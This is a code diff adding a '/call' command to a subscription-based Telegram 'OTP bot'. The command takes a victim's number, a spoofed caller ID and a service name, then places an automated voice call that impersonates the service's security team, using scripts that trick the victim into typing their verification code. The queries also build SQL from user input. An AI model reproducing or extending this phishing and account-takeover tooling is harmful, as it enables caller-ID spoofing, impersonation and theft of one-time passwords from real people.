@@ -1407,6 +1407,94 @@ def make_call_custon(message):
                  bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
     else:
        send_welcome(message)
+#########################################################################################################################
+
+
+
+
+############################################CALL PREBUID#######################################################################
+
+@bot.message_handler(commands=['call'])
+def make_call_custon(message):
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor()
+    id = message.from_user.id
+    username = message.from_user.username
+    c.execute(f"Select * from users where user_id={id}")
+    row= c.fetchone()
+    if row!=None :
+        if row[3]!='ban':
+            if user_day_check(id)>0:
+                    mes =(message.text).split()
+                    try:
+                        number = mes[1]
+                        spoof = mes[2]
+                        service = mes[3]
+                        otp_digit = mes[4]
+                        voice = mes[5]
+                        bot.send_message(message.from_user.id,f"""
+┏━━⚇
+┃<b>Call Details</b> 🤳 
+┗━━━━━━━━✺
+<b>[☎️] Calling To »»</b><code>{number}</code>
+<b>[📞] Spoofer ID »»</b><code>{spoof}</code> 
+<b>[📝] Script ID »»</b> <code>{service}</code>
+<b>[🧏]Voice »»</b><code>{voice}</code>
+""",parse_mode='HTML')
+                        script_id = service + voice
+                        c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
+                        db.commit()
+
+                        SC1 ="Hello dear customer, this is an automated call from {service_name}, we have received a request to change your registered phone number from your  {service_name} account, if this was not you please press one , or if this request is made by you please hang up the call and have a great day."
+                        SC2 = "To block this request please enter the {digits} digit verification code sent on your registered mobile number, this is to ensure the safety and security of our customers."
+                        SC3 = "Please wait, while we verify your identity."
+                        SC4 = "The code that you have entered was expired or invalid, please enter the correct verification code that you received on your registered Phone number."
+                        SC5 = "Thank you, Your Number change Attempt has been blocked, thank you for cooperating with us."
+                        
+                        
+                        
+                        Convert_TTS(SC1.format(service_name=service),SC2.format(digits=otp_digit),SC5,SC3,SC4,script_id,voice)
+                        c.execute(f"Select * from users where user_id={id}")
+                        row= c.fetchone()
+                        call_s1 = row[6]
+                        
+                        c.execute(f"Select * from users where user_id={id}")
+                        row= c.fetchone()
+                        call_s1 = row[6]
+                        if (call_s1!=0):
+                
+                                c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
+                                db.commit()
+                                call_update(id)
+                                b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
+
+                        else:
+                            bot.send_message(message.from_user.id, """*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*""",parse_mode='markdown')
+                    except:
+                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*",parse_mode='markdown')
+            else:
+                   bot.send_message(message.from_user.id, "*🚫Buy Subscription.🚫*",parse_mode='markdown')  
+                   delete_data(id) 
+        else:
+                 bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
+    else:
+       send_welcome(message)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ##############################Aplhabetical Custom call#######################################################################
@@ -1486,6 +1574,10 @@ def clear(message):
     bot.send_message(message.from_user.id,f"""*Logs Cleared*""",parse_mode='markdown')
     dbc.close()
 
+
+
+
+
 @bot.message_handler(commands=['switch'])
 def main_api_key(message):
     global main_api
@@ -1494,9 +1586,6 @@ def main_api_key(message):
     elif main_api['api']==apiKey2:
          main_api['api']=apiKey
     bot.send_message(message.from_user.id,f"*Api switched to {main_api['api']} ✅ *",parse_mode='markdown')
-
-
-
 
 
 
